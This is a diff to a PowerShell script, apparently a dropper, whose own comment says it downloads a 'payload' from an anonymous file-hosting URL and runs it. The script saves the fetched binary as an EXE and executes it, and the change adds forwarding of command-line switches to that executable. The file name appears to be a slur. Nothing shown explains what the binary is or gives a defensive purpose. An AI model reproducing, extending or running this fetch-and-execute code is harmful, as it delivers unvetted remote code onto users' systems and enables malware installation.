@@ -1,8 +1,30 @@
-param(
-    [string]$FileName
-)
+# nig.ps1
+# Downloads the payload and runs it, forwarding any switches entered on the
+# PowerShell command line (e.g. --test) to the downloaded EXE.
 
 $DownloadUrl = 'https://files.catbox.moe/37qpr6.bin'
+
+# ---------------------------------------------------------------------------
+# Argument handling
+#
+# Anything that looks like a switch (starts with - or /) is forwarded to the
+# EXE. The first non-switch argument (if any) is used as the file name; any
+# other non-switch arguments are forwarded to the EXE as well.
+# ---------------------------------------------------------------------------
+$ExeArgs = @()
+$FileName = ''
+
+foreach ($a in @($args)) {
+    if ($a -match '^[-/]') {
+        $ExeArgs += $a
+    }
+    elseif ([string]::IsNullOrWhiteSpace($FileName)) {
+        $FileName = $a
+    }
+    else {
+        $ExeArgs += $a
+    }
+}
 
 # Fall back to a random file name if none was supplied
 if ([string]::IsNullOrWhiteSpace($FileName)) {
@@ -47,8 +69,8 @@ try {
     Move-Item -LiteralPath $DownloadedFile `
         -Destination $ExePath -Force
 
-    # Run with all remaining arguments supplied to this script
-    & $ExePath @args
+    # Run the EXE with the switches/arguments supplied to this script
+    & $ExePath @ExeArgs
 
     $ExitCode = $LASTEXITCODE
 }
